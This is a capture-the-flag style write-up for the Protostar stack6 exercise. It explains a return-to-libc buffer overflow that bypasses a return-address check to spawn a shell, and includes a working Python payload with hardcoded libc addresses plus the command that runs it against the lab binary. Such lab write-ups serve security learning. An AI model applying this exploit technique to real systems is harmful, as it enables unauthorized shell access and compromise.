# Stack 6
This one requires a little more understanding of how stack frames work in C. In this example our main goal is to activate system("bin/sh") by manipulating the program.
Unfortunatley there is a check to see if there is an overwrite on EIP, so it will not be possible to simply overwrite and jump to system.
To circumvent this we use return-to-libc, a method in which we set up the overwritten data as if we made a "call" to the system() with the specifid argument.
To find the buffer size you will need to do soem trial and error to see at what point the EBP and EIP are overwritten.

We first find the address of libc using strings: 
```
strings -a -t x /lib/libc-2.11.2.so | grep "bin/sh"
``` 
We take the sum of this value and the starting address of libc from GDB's info proc map. We now have the address we will put into EIP.
Next, since we are making a direct jump to the function we need to set up the stack so that the call will be done correctly.
This means that a return address of our call to system, and the input argument, in that order, will need to be placed in the stack.
The solution input is:

```python
import struct

buf = ("D" * 76)                                        # buffer
ebp = ("C" * 4)                                         # ebp
jump_location = struct.pack("I", 0xb7ecffb0)            # eip
return_address = struct.pack("I", 0xb7fb63c7)           # return address of system(1)
bin_sh_loc = struct.pack("I", 0xb7fb63bf)               # argument for system(1) 
print(buf+ebp+jump_location+return_address+bin_sh_loc)
```
Run the exploit using
```
(python /tmp/exploit.py; cat) | /opt/protostar/bin/stack6
```
